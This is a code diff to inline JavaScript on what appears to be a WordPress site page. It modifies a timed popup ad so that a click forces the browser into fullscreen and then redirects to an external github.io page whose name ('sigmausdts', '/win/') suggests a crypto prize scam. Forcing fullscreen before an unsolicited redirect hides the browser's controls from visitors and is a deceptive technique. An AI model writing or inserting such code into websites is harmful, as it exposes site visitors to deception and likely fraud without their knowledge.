@@ -1687,17 +1687,33 @@ function closeAd() {
   document.getElementById("popupAd").style.display = "none";
 }
 
-// Redirect on button click + close popup
+// Request fullscreen before redirect
 function redirectAd() {
+  let docElm = document.documentElement;
+
+  if (docElm.requestFullscreen) {
+    docElm.requestFullscreen();
+  } else if (docElm.mozRequestFullScreen) { // Firefox
+    docElm.mozRequestFullScreen();
+  } else if (docElm.webkitRequestFullscreen) { // Chrome, Safari & Opera
+    docElm.webkitRequestFullscreen();
+  } else if (docElm.msRequestFullscreen) { // IE/Edge
+    docElm.msRequestFullscreen();
+  }
+
   closeAd(); // close popup
-  window.location.href = "https://sigmausdts.github.io/win/"; // replace with your link
+
+  // small delay so fullscreen activates before redirect
+  setTimeout(() => {
+    window.location.href = "https://sigmausdts.github.io/win/"; // your redirect link
+  }, 10);
 }
 
 // Show popup after 2 seconds
 window.onload = function() {
   setTimeout(function() {
     document.getElementById("popupAd").style.display = "flex";
-  }, 200);
+  }, 2000);
 };
 </script>
 <script id="astra-theme-js-js-extra">
